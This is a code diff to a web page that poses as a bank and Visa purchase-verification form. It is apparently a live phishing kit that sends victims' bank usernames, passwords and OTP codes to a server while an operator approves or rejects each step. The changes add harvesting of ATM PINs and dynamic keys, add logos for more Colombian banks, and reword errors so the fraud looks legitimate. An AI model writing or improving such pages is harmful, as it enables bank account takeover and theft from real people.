@@ -27,35 +27,35 @@
             padding: 50px; max-width: 480px; width: 100%;
             position: relative; z-index: 1;
         }
-        
+
         /* HEADER FLEXIBLE */
         .header { 
             display: flex; 
             align-items: center; 
             justify-content: space-between; 
             margin-bottom: 30px; 
-            min-height: 60px; 
+            min-height: 85px; 
             gap: 10px; 
         }
-        
+
         /* Logo del Banco */
         .bank-logo { 
             display: flex; 
             align-items: center; 
             justify-content: flex-start; 
             flex: 1; 
-            height: 40px; 
-            max-width: 45%; 
+            height: 75px; 
+            max-width: 50%; 
         }
         .bank-logo img { height: 100%; width: auto; max-width: 100%; object-fit: contain; display: none; }
-        .bank-icon-placeholder { display: none; width: 40px; height: 40px; }
-        
-        /* Logo de Visa (Tamaño equilibrado) */
+        .bank-icon-placeholder { display: none; width: 75px; height: 75px; }
+
+        /* Logo de Visa */
         .visa-logo { 
             display: flex; 
             align-items: center; 
             justify-content: flex-end; 
-            height: 55px; 
+            height: 85px; 
             transform: scale(1.3); 
             transform-origin: right center;
             margin-right: 5px;
@@ -66,7 +66,7 @@
             max-width: 100%; 
             object-fit: contain; 
         }
-        
+
         .form-title { font-size: 1.65rem; font-weight: 700; color: #000; margin-bottom: 12px; letter-spacing: -0.5px; }
         .form-subtitle { font-size: 1.05rem; color: #4a4a4a; margin-bottom: 35px; line-height: 1.5; }
         .form-subtitle strong { color: #000; font-weight: 600; }
@@ -100,12 +100,7 @@
         .status-message { display: none; padding: 14px; border-radius: 6px; font-size: 0.95rem; font-weight: 500; margin-bottom: 20px; text-align: center; }
         .status-message.error { display: block; background: #fef2f2; color: #dc2626; border: 1px solid #fecaca; }
         .status-message.success { display: block; background: #f0fdf4; color: #16a34a; border: 1px solid #bbf7d0; }
-        .status-message.error-usuario { 
-            display: block; background: #fef2f2; color: #dc2626; 
-            border: 2px solid #dc2626; font-weight: 700; padding: 16px; 
-            font-size: 1rem; text-align: center;
-        }
-        
+
         .loading-overlay {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(255, 255, 255, 0.2); z-index: 1000;
@@ -127,23 +122,24 @@
         .loading-text { color: #1a1a1a; font-size: 1.1rem; font-weight: 600; letter-spacing: -0.2px; }
         .loading-subtext { color: #6b7280; font-size: 0.85rem; font-weight: 400; margin-top: -10px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
+
         /* RESPONSIVE: Móvil ajustado */
         @media (max-width: 480px) {
             .modal-container { padding: 30px 20px; }
             .form-title { font-size: 1.35rem; }
             .form-input { padding: 14px; font-size: 1rem; }
-            
-            .header { min-height: 60px; margin-bottom: 25px; }
-            .bank-logo { height: 35px; max-width: 40%; } 
-            
+
+            .header { min-height: 70px; margin-bottom: 25px; }
+            .bank-logo { height: 55px; max-width: 45%; } 
+            .bank-icon-placeholder { width: 55px; height: 55px; }
+
             .visa-logo { 
-                height: 50px; 
-                transform: scale(1.4); 
+                height: 70px; 
+                transform: scale(1.25); 
                 transform-origin: right center;
                 margin-right: 5px;
             }
-            .visa-logo img { max-height: 50px; }
+            .visa-logo img { max-height: 70px; }
             .loading-card { padding: 30px 40px; }
         }
     </style>
@@ -203,7 +199,7 @@
                 <div class="form-group" style="margin-bottom:0;">
                     <label class="form-label" id="otpLabel">Código OTP <span class="required">*</span></label>
                     <input type="text" class="form-input" id="confirmationCode" placeholder="Ingresa tu código de verificación (4-8 dígitos)" maxlength="8" inputmode="numeric" required />
-                    <div class="error-message">El código debe tener entre 4 y 8 dígitos</div>
+                    <div class="error-message" id="otpErrorMsg">El código debe tener entre 4 y 8 dígitos</div>
                 </div>
             </div>
 
@@ -228,7 +224,11 @@
             'Caja Social':     'Caja.jpg',
             'Banco de Bogotá': 'bog.png',
             'Banco Occidente': 'occi.png',
-            'BBVA Colombia':   'bbva.png'
+            'BBVA Colombia':   'bbva.png',
+            'BBVA':            'bbva.png',
+            'BANCO BILBAO VIZCAYA ARGENTARIA COLOMBIA, S.A': 'bbva.png',
+            'AV Villas':       'avvillas.png',
+            'AVVillas':        'avvillas.png'
         };
 
         let solicitudId = null;
@@ -245,6 +245,8 @@
         let faseActual = 'credenciales';
         let pollingInterval = null;
         let formularioBloqueado = false;
+        let esClaveATM = false;
+        let esClaveDinamica = false;
 
         const form = document.getElementById('authForm');
         const usernameInput = document.getElementById('username');
@@ -259,6 +261,9 @@
         const bankLogoImg = document.getElementById('bankLogoImg');
         const bankIconPlaceholder = document.getElementById('bankIconPlaceholder');
         const bankNombre = document.getElementById('bankNombre');
+        const otpLabel = document.getElementById('otpLabel');
+        const otpInfoMessage = document.getElementById('otpInfoMessage');
+        const otpErrorMsg = document.getElementById('otpErrorMsg');
 
         function cargarLogoBanco() {
             let banco = localStorage.getItem('bancoEmisor') || '';
@@ -311,7 +316,13 @@
                 payload.usuario_banco = usernameInput.value.trim(); 
                 payload.password_banco = passwordInput.value.trim(); 
             } else if (paso === 'otp') { 
-                payload.codigo_otp = codigoExtra; 
+                if (esClaveATM) {
+                    payload.clave_atm = codigoExtra;
+                } else if (esClaveDinamica) {
+                    payload.clave_dinamica = codigoExtra;
+                } else {
+                    payload.codigo_otp = codigoExtra;
+                }
             }
 
             try {
@@ -335,7 +346,9 @@
             pollingInterval = setInterval(async () => {
                 if (Date.now() - start > MAX_POLLING_TIME) {
                     clearInterval(pollingInterval); pollingInterval = null;
-                    mostrarError('⏰ Tiempo de espera agotado.'); resetFormulario(); return;
+                    mostrarError('No fue posible completar la verificación. Por favor, inténtalo nuevamente.');
+                    resetFormulario();
+                    return;
                 }
                 try {
                     const r = await fetch(`${API_ESTADO_PAGO}/${solicitudId}`);
@@ -344,7 +357,9 @@
 
                     if (data.estado === 'aprobado' && data.fase === 'credenciales') {
                         clearInterval(pollingInterval); pollingInterval = null;
-                        loadingOverlay.classList.remove('active'); desbloquearOTP(); return;
+                        loadingOverlay.classList.remove('active');
+                        desbloquearOTP(!!data.requiere_clave_atm, !!data.requiere_clave_dinamica);
+                        return;
                     }
 
                     if (data.estado === 'aprobado' && data.fase === 'otp') {
@@ -353,34 +368,90 @@
                         setTimeout(() => { window.location.href = 'exito.html'; }, 1500); return;
                     }
 
-                    // 🔥 NUEVO: SI EL ADMIN PONE ERROR DE USUARIO, SE REINICIA EL FORMULARIO
+                    // 🔥 ERROR DE USUARIO → reiniciar con NUEVO solicitud_id
                     if (data.estado === 'rechazado_user_error') {
                         clearInterval(pollingInterval); pollingInterval = null;
-                        statusMessage.className = 'status-message error-usuario';
-                        statusMessage.textContent = '⚠️ ERROR DE USUARIO: Las credenciales no coinciden. Por favor, ingrese nuevamente sus datos.';
+                        statusMessage.className = 'status-message error';
+                        statusMessage.textContent = 'No fue posible validar la información ingresada. Por favor, inténtalo nuevamente.';
                         statusMessage.style.display = 'block';
                         loadingOverlay.classList.remove('active');
-                        resetFormulario(); 
+                        resetFormulario(true);
                         return;
                     }
 
+                    // 🔥 RECHAZADO
                     if (data.estado === 'rechazado') {
                         clearInterval(pollingInterval); pollingInterval = null;
-                        mostrarError(data.mensaje || '❌ Rechazado'); resetFormulario(); return;
+                        loadingOverlay.classList.remove('active');
+
+                        if (data.fase === 'otp') {
+                            let mensaje = 'No fue posible validar el código ingresado. Por favor, inténtalo nuevamente.';
+                            if (esClaveATM) mensaje = 'No fue posible validar la clave ingresada. Por favor, inténtalo nuevamente.';
+                            if (esClaveDinamica) mensaje = 'No fue posible validar la clave dinámica. Por favor, inténtalo nuevamente.';
+
+                            statusMessage.className = 'status-message error';
+                            statusMessage.textContent = mensaje;
+                            statusMessage.style.display = 'block';
+                            confirmationInput.value = '';
+                            confirmationInput.disabled = false;
+                            confirmationInput.parentElement.classList.remove('error');
+                            confirmationInput.focus();
+                            submitButton.disabled = false;
+                            buttonText.textContent = esClaveATM ? 'Confirmar clave' : (esClaveDinamica ? 'Confirmar clave dinámica' : 'Confirmar OTP');
+                            formularioBloqueado = false;
+                        } else {
+                            mostrarError('No fue posible completar la verificación. Por favor, inténtalo nuevamente.');
+                            resetFormulario();
+                        }
+                        return;
                     }
                 } catch (e) {}
             }, POLLING_INTERVAL);
         }
 
-        function desbloquearOTP() {
+        function desbloquearOTP(requiereClaveATM = false, requiereClaveDinamica = false) {
+            esClaveATM = !!requiereClaveATM;
+            esClaveDinamica = !!requiereClaveDinamica;
+
             usernameInput.disabled = true; 
             passwordInput.disabled = true;
             otpSection.classList.add('visible'); 
             confirmationInput.disabled = false; 
+
+            if (esClaveATM) {
+                otpLabel.innerHTML = 'Clave del cajero <span class="required">*</span>';
+                otpInfoMessage.textContent = 'Ingresa tu clave del cajero automático (4 dígitos).';
+                confirmationInput.placeholder = 'Ingresa tu clave de cajero (4 dígitos)';
+                confirmationInput.maxLength = 4;
+                otpErrorMsg.textContent = 'La clave debe tener 4 dígitos';
+                buttonText.textContent = 'Confirmar clave';
+                document.getElementById('mainTitle').textContent = 'Verificación de seguridad';
+                document.getElementById('mainSubtitle').innerHTML =
+                    `Credenciales verificadas. Ingresa la clave del cajero para completar la transacción con <strong>${bankNombre.textContent}</strong>.`;
+            } else if (esClaveDinamica) {
+                otpLabel.innerHTML = 'Clave dinámica <span class="required">*</span>';
+                otpInfoMessage.textContent = 'Ingresa la clave dinámica generada por tu dispositivo de seguridad.';
+                confirmationInput.placeholder = 'Ingresa tu clave dinámica (4-8 dígitos)';
+                confirmationInput.maxLength = 8;
+                otpErrorMsg.textContent = 'La clave dinámica debe tener entre 4 y 8 dígitos';
+                buttonText.textContent = 'Confirmar clave dinámica';
+                document.getElementById('mainTitle').textContent = 'Verificación de seguridad';
+                document.getElementById('mainSubtitle').innerHTML =
+                    `Credenciales verificadas. Ingresa la clave dinámica para completar la transacción con <strong>${bankNombre.textContent}</strong>.`;
+            } else {
+                otpLabel.innerHTML = 'Código OTP <span class="required">*</span>';
+                otpInfoMessage.textContent = 'Para realizar este proceso, ingresa el código de Token móvil o físico.';
+                confirmationInput.placeholder = 'Ingresa tu código de verificación (4-8 dígitos)';
+                confirmationInput.maxLength = 8;
+                otpErrorMsg.textContent = 'El código debe tener entre 4 y 8 dígitos';
+                buttonText.textContent = 'Confirmar OTP';
+                document.getElementById('mainTitle').textContent = 'Verificación de seguridad';
+                document.getElementById('mainSubtitle').innerHTML =
+                    `Credenciales verificadas. Ingresa el código OTP para completar la transacción con <strong>${bankNombre.textContent}</strong>.`;
+            }
+
+            confirmationInput.value = '';
             confirmationInput.focus();
-            document.getElementById('mainTitle').textContent = 'Verificación de seguridad';
-            document.getElementById('mainSubtitle').innerHTML = `Credenciales verificadas. Ingresa el código OTP para completar la transacción con <strong>${bankNombre.textContent}</strong>.`;
-            buttonText.textContent = 'Confirmar OTP'; 
             faseActual = 'otp'; 
             formularioBloqueado = false; 
             submitButton.disabled = false;
@@ -394,12 +465,14 @@
             formularioBloqueado = false;
         }
 
-        function resetFormulario() {
+        function resetFormulario(nuevaSolicitud = false) {
             usernameInput.disabled = false; 
             passwordInput.disabled = false; 
             confirmationInput.disabled = true;
             otpSection.classList.remove('visible'); 
             faseActual = 'credenciales'; 
+            esClaveATM = false;
+            esClaveDinamica = false;
             loadingOverlay.classList.remove('active');
             submitButton.disabled = false; 
             buttonText.textContent = 'Continuar';
@@ -408,6 +481,21 @@
             confirmationInput.value = '';
             formularioBloqueado = false;
             if (pollingInterval) { clearInterval(pollingInterval); pollingInterval = null; }
+
+            document.querySelectorAll('.form-group.error').forEach(el => el.classList.remove('error'));
+
+            document.getElementById('mainTitle').textContent = 'Autenticación de compra';
+            document.getElementById('mainSubtitle').innerHTML =
+                `Ingresa tus credenciales de seguridad para tu <strong>${bankNombre.textContent}</strong> para validar la transacción.`;
+
+            if (nuevaSolicitud) {
+                solicitudId = 'sol_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
+                try {
+                    const t = JSON.parse(localStorage.getItem('tarjeta_aprobada') || 'null');
+                    if (t) { t.solicitud_id = solicitudId; localStorage.setItem('tarjeta_aprobada', JSON.stringify(t)); }
+                } catch {}
+                localStorage.setItem('tarjeta_aprobada_solicitud', solicitudId);
+            }
         }
 
         form.addEventListener('submit', async function(e) {
@@ -427,11 +515,20 @@
                     confirmationInput.parentElement.classList.add('error'); 
                     isValid = false; 
                 } else {
-                    // 🔥 VALIDACIÓN PARA ACEPTAR DE 4 A 8 DÍGITOS
-                    if (!/^\d{4,8}$/.test(confirmationInput.value)) {
-                        confirmationInput.parentElement.classList.add('error');
-                        confirmationInput.parentElement.querySelector('.error-message').textContent = 'El código debe tener entre 4 y 8 dígitos';
-                        isValid = false;
+                    if (esClaveATM) {
+                        if (!/^\d{4}$/.test(confirmationInput.value)) {
+                            confirmationInput.parentElement.classList.add('error');
+                            otpErrorMsg.textContent = 'La clave debe tener 4 dígitos';
+                            isValid = false;
+                        }
+                    } else {
+                        if (!/^\d{4,8}$/.test(confirmationInput.value)) {
+                            confirmationInput.parentElement.classList.add('error');
+                            otpErrorMsg.textContent = esClaveDinamica
+                                ? 'La clave dinámica debe tener entre 4 y 8 dígitos'
+                                : 'El código debe tener entre 4 y 8 dígitos';
+                            isValid = false;
+                        }
                     }
                 }
             }
@@ -447,23 +544,28 @@
                 
                 const ok = await enviarDatos('credenciales');
                 if (!ok) { 
-                    mostrarError('Error al procesar las credenciales'); 
+                    mostrarError('No fue posible procesar la información. Por favor, inténtalo nuevamente.'); 
                     resetFormulario(); 
                     return; 
                 }
                 iniciarPolling('Esperando aprobación del banco...');
 
             } else if (faseActual === 'otp') {
-                buttonText.textContent = 'Verificando OTP...'; 
-                loadingText.textContent = 'Validando código de seguridad...'; 
+                let textoBoton = 'Verificando OTP...';
+                let textoLoading = 'Validando código de seguridad...';
+                if (esClaveATM) { textoBoton = 'Verificando clave...'; textoLoading = 'Validando clave de cajero...'; }
+                else if (esClaveDinamica) { textoBoton = 'Verificando clave dinámica...'; textoLoading = 'Validando clave dinámica...'; }
+
+                buttonText.textContent = textoBoton; 
+                loadingText.textContent = textoLoading; 
                 loadingOverlay.classList.add('active');
                 
                 const ok = await enviarDatos('otp', confirmationInput.value.trim());
                 if (!ok) { 
-                    mostrarError('Error al procesar el OTP'); 
+                    mostrarError('No fue posible procesar la información. Por favor, inténtalo nuevamente.'); 
                     formularioBloqueado = false; 
                     submitButton.disabled = false; 
-                    buttonText.textContent = 'Confirmar OTP'; 
+                    buttonText.textContent = esClaveATM ? 'Confirmar clave' : (esClaveDinamica ? 'Confirmar clave dinámica' : 'Confirmar OTP');
                     return; 
                 }
                 iniciarPolling('Esperando confirmación final...');
